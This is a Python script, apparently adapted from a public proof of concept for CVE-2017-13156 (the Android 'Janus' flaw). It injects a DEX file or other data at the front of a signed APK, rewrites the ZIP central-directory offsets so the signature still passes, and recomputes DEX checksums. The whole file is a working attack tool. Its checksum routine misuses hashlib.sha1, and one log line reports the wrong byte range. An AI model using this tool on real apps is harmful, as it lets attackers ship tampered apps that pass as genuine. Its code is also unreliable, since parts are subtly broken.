#!/usr/bin/env python3

# Based on https://github.com/V-E-O/PoC/tree/8c389899e6c4e16b2ddab9ba6d77c2696577366f/CVE-2017-13156

import os
import sys
import struct
import zipfile
import argparse
from zlib import adler32
from hashlib import sha1

verbosity = 0


def verbose_log(level, message):
    if level <= verbosity:
        print(message)


def update_checksum(data):
    # Update SHA1 (20 bytes)
    data[12:32] = sha1.digest(data[32:])

    # Update Adler32 (8 bytes)
    v = adler32(memoryview(data[12:])) & 0xffffffff
    data[8:12] = struct.pack('<L', v)


def main():
    global verbosity

    # Setup command arguments
    parser = argparse.ArgumentParser(description='Inject custom code or custom data to an APK.')
    parser.add_argument('-d', '--dex', action='store_true', help='use this flag to correct the input DEX\'s checksums.')
    parser.add_argument('-v', '--verbosity', action='count', help='increase output verbosity (e.g., -vv is more than -v)')
    parser.add_argument('input_data', help='this can be a DEX file or custom data, like a TXT file.')
    parser.add_argument('input_apk', help='the APK you want to inject the custom_data into.')
    parser.add_argument('output_apk', help='the output APK filename.')
    args = parser.parse_args()

    # Load arguments
    input_data_file = args.input_data
    input_apk_file = args.input_apk
    output_apk_file = args.output_apk
    verbosity = args.verbosity

    print(args.verbosity)

    # Check if input APK is a ZIP file
    if not zipfile.is_zipfile(input_apk_file):
        print("\"{}\" is not a APK/ZIP file.".format(input_apk_file))
        exit(1)

    # Load input data file
    with open(input_data_file, 'rb') as f:
        verbose_log(1, 'Reading data from {}...'.format(input_data_file))
        input_data = bytearray(f.read())
    input_data_size = len(input_data)

    # Load target APK file
    with open(input_apk_file, 'rb') as f:
        apk_data = bytearray(f.read())

    # Find Central Directory end address
    cd_end_addr = apk_data.rfind(b'\x50\x4b\x05\x06')
    verbose_log(1, 'Central Directory end address: {}'.format(cd_end_addr))

    # Find Central Directory start address
    cd_start_addr = struct.unpack('<L', apk_data[cd_end_addr+16:cd_end_addr+20])[0]
    verbose_log(1, 'Central Directory start address: {}'.format(cd_start_addr))

    # Offset address
    new_data = struct.pack('<L', cd_start_addr + input_data_size)
    verbose_log(2, 'Data modified from "{}" to "{}"'.format(bytes(apk_data[cd_end_addr+16:cd_end_addr+20]), new_data))
    apk_data[cd_end_addr+16:cd_end_addr+20] = new_data

    # Offset all remaining addresses
    pos = cd_start_addr
    while pos < cd_end_addr:
        offset = struct.unpack('<L', apk_data[pos+42:pos+46])[0]
        new_data = struct.pack('<L', offset + input_data_size)
        verbose_log(2, 'Data modified from "{}" to "{}"'.format(bytes(apk_data[pos+16:pos+20]), new_data))
        apk_data[pos+42:pos+46] = new_data
        pos = apk_data.find(b'\x50\x4b\x01\x02', pos+46, cd_end_addr)
        if pos == -1:
            break

    # Merge data
    out_data = input_data + apk_data

    # Fix checksum
    if args.dex:
        verbose_log(1, 'Fixing DEX checksum...')
        out_data[32:36] = struct.pack('<L', len(out_data))
        update_checksum(out_data)

    # Export APK
    with open(output_apk_file, 'wb') as f:
        verbose_log(1, 'Saving injected APK to {}...'.format(output_apk_file))
        f.write(out_data)

    print('Successfully generated {}.'.format(output_apk_file))


if __name__ == '__main__':
    main()
